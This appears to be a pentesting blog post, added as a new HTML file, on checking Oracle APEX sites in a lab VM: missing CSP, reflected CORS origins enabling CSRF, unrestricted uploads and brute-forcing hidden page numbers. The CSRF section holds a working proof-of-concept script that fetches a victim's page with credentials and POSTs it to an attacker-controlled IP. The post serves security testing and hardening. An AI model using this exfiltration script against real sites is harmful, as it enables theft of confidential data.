@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Basic checks to do when pentesting an Oracle Apex site</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Basic checks to do when pentesting an Oracle Apex site | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Basic checks to do when pentesting an Oracle Apex site" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:8000/Oracle-Apex" />
+<meta property="og:url" content="http://localhost:8000/Oracle-Apex" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/apex-oracle/apex-banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-26T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/apex-oracle/apex-banner.png" />
+<meta property="twitter:title" content="Basic checks to do when pentesting an Oracle Apex site" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2024-12-26T00:00:00-05:00","datePublished":"2024-12-26T00:00:00-05:00","description":"Introduction","headline":"Basic checks to do when pentesting an Oracle Apex site","image":"http://localhost:8000/assets/images/apex-oracle/apex-banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Oracle-Apex"},"url":"http://localhost:8000/Oracle-Apex"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/apex-oracle/apex-banner.png/../banner.png>
+  
+  <h2>Basic checks to do when pentesting an Oracle Apex site</h2>
+  <time datetime="2024-12-26T00:00:00-05:00" class="by-line">26 Dec 2024</time>
+  <h1 id="introduction">Introduction</h1>
+
+<p>Oracle Apex is a platform that allows you to create applications without any need of coding, when I work with a website that was created using it I always start with the same checks so I write this post to show those checks. For these examples we can use the free VM available at <a href="https://www.oracle.com/database/technologies/databaseappdev-vm.html">https://www.oracle.com/database/technologies/databaseappdev-vm.html</a>. Once we have it running We will deploy the example app “Sample File Upload and Download”.</p>
+
+<p><img src="/assets/images/apex-oracle/sample-upload.png" alt="" /></p>
+
+<p>Once we have the App deployed and a user added we can log in to it.</p>
+
+<p><img src="/assets/images/apex-oracle/login.png" alt="" /></p>
+
+<p>Now we are inside the site</p>
+
+<p><img src="/assets/images/apex-oracle/menu.png" alt="" /></p>
+
+<h1 id="content-security-policy-header">Content Security Policy header</h1>
+
+<p>The Content Security Policy header is recomended by the ASVS starting from the level 1 (check 14.4.3), but if we check the headers we don’t find it.</p>
+
+<p><img src="/assets/images/apex-oracle/headers.png" alt="" /></p>
+
+<p>While Apex does a good job sanitizing any input that a user makes on any App developed on it, having that extra layer of protection is always good, and it is even suggested on the manual <a href="https://docs.oracle.com/en/database/oracle/apex/23.2/aeadm/configuring-http-attributes.html#GUID-E19AA8F4-0292-4437-BA32-FE2B8ACCF63C">https://docs.oracle.com/en/database/oracle/apex/23.2/aeadm/configuring-http-attributes.html#GUID-E19AA8F4-0292-4437-BA32-FE2B8ACCF63C</a></p>
+
+<h1 id="cross-site-request-forgering">Cross Site Request Forgering</h1>
+
+<p>If we send a HTTP Request from a diferent origin we can see that the header “Access-Control-Allow-Origin” reflects any origin we send, and that the header “Access-Control-Allow-Credentials” is set to true.</p>
+
+<p><img src="/assets/images/apex-oracle/csrf.png" alt="" /></p>
+
+<p>While this condtion would make the site vulnerable to Cross Site Request Forgering attacks, there is a couple of restrictions that would block this kind of attack, first, by default browsers protects the cookies to be sent to external sites so the attack wouldn’t work on normal browsers.</p>
+
+<p><img src="/assets/images/apex-oracle/protection.png" alt="" /></p>
+
+<p>If by any reason a user disables the protection that would make him vulnerable, we can test this by disabling this protection.</p>
+
+<p><img src="/assets/images/apex-oracle/custom.png" alt="" /></p>
+
+<p>On top of that, every request made by a user has to send the parameter “session”, you can think of this parameter as an extra cookie, it is randomly generated every time a user logs in and if a request contains the cookie of session but not the session parameter it will fail, so for an attacker to craft a working payload they would need access to a reverse proxy, WAF, server, etc that is in the middle of the conversation and logs the URLs requested so we can get the session values that are currently active.</p>
+
+<p><img src="/assets/images/apex-oracle/session.png" alt="" /></p>
+
+<p>Asuming these conditions are met we can create a HTMl file that would access a site on the page and send the information to our machine to exfiltrate information.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+ <span class="nt">&lt;title&gt;</span>CSRF POC<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"get()"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">get</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">panel_req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+    <span class="c1">//Session ID needed to perform the attacks</span>
+    <span class="nx">session</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">12280546138280</span><span class="dl">"</span>
+    <span class="nx">panel_req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">panel_req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">panel_req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
+            <span class="c1">//Attacker controlled site</span>
+            <span class="nx">attacker</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://192.168.56.106:443/receive</span><span class="dl">"</span>
+            <span class="nx">exfiltrate</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+            <span class="nx">exfiltrate</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">attacker</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+            <span class="nx">exfiltrate</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">panel_req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">//URL of the panel to exfiltrate</span>
+    <span class="nx">URLpanel</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://192.168.56.147:8080/ords/r/hrrest/sample-file-upload-download/7?session=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">session</span>
+    <span class="nx">panel_req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">URLpanel</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nx">panel_req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">panel_req</span><span class="p">.</span><span class="nf">send</span><span class="p">()</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Once we have the html file hosted on a file and a listener running we can access to the site with our victim user.</p>
+
+<p><img src="/assets/images/apex-oracle/browse-csrf.png" alt="" /></p>
+
+<p>And after the user access to the site on our receiver we can validate that the information contained on the page was sent to us, while on this example application the information that was hosted there doesn’t have a special meaning on a real site we could exfiltrate confidential information that only a small group of users should have access to.</p>
+
+<p><img src="/assets/images/apex-oracle/received.png" alt="" /></p>
+
+<p>While it would be more interesting to make changes on the site those requests go to “/ords/wwv_flow.ajax”, and if we try to send a request there from a diferent origin we will get a forbidden response.</p>
+
+<p><img src="/assets/images/apex-oracle/post.png" alt="" /></p>
+
+<p>It is recomended to make the site respond with a Forbidden to any request that comes from a different site to avoid this kind of issues.</p>
+
+<h1 id="file-upload">File Upload</h1>
+
+<p>If we go to the file upload section we can see that it indicates that any file must have a size under 15MB, but this is just a text set on the page we have to validate that value.</p>
+
+<p><img src="/assets/images/apex-oracle/file-upload.png" alt="" /></p>
+
+<p>If we go to the admin side of the panel we can see that there is no size limit, due this any user would be able to fill up the disk space with garbage files, it’s also worth noting that by default there is no restriction to the files types that can be uploaded.</p>
+
+<p><img src="/assets/images/apex-oracle/upload-admin.png" alt="" /></p>
+
+<p>Another thing to consider is that the files uploaded to a site developed on Apex are not stored inside the disk as simple files, but they are stored inside the database as Blobs, making it imposible to use a software antivirus to make sure malware is not being uploaded to the platform, to scan the files uploaded we have to set up an ICAP server and configure Apex to connect to it <a href="https://support.oracle.com/knowledge/Middleware/2665869_1.html">https://support.oracle.com/knowledge/Middleware/2665869_1.html</a>.</p>
+
+<h1 id="site-enumeration">Site enumeration</h1>
+
+<p>If we analyze the HTTP code of any page on the site we can notice that it includes a page-<em>number</em>.</p>
+
+<p><img src="/assets/images/apex-oracle/page-num.png" alt="" /></p>
+
+<p>Actually we can use that number to access to any site instead of using the page name.</p>
+
+<p><img src="/assets/images/apex-oracle/page-site.png" alt="" /></p>
+
+<p>These numbers are defined by the developers.</p>
+
+<p><img src="/assets/images/apex-oracle/page-admin.png" alt="" /></p>
+
+<p>To make a simple test we create a comment page with a high number.</p>
+
+<p><img src="/assets/images/apex-oracle/new-page.png" alt="" /></p>
+
+<p>An then let’s eliminate it from the menu so there is no way for a user to know it exists.</p>
+
+<p><img src="/assets/images/apex-oracle/navigation.png" alt="" /></p>
+
+<p>Now if we access to the site we don’t see any changes on the menu.</p>
+
+<p><img src="/assets/images/apex-oracle/deleted.png" alt="" /></p>
+
+<p>Since we can access to any page by its number it’s easy to bruteforce the pages.</p>
+
+<p><img src="/assets/images/apex-oracle/fuzz.png" alt="" /></p>
+
+<p>On this example we are using the fuzzer module of Zaproxy.</p>
+
+<p><img src="/assets/images/apex-oracle/zapfuzz.png" alt="" /></p>
+
+<p>After running the fuzzing we can see that we were able to find the hidden page.</p>
+
+<p><img src="/assets/images/apex-oracle/output-fuzz.png" alt="" /></p>
+
+<p>Nothe that we actually don’t need to have a valid session to achieve that, if we try to bruteforce the pages without a session we will get redirected when a page exists on the site</p>
+
+<p><img src="/assets/images/apex-oracle/nologin.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#oracle"> Oracle</a> &nbsp;
+  
+  <a href="/tags.html#apex"> Apex</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
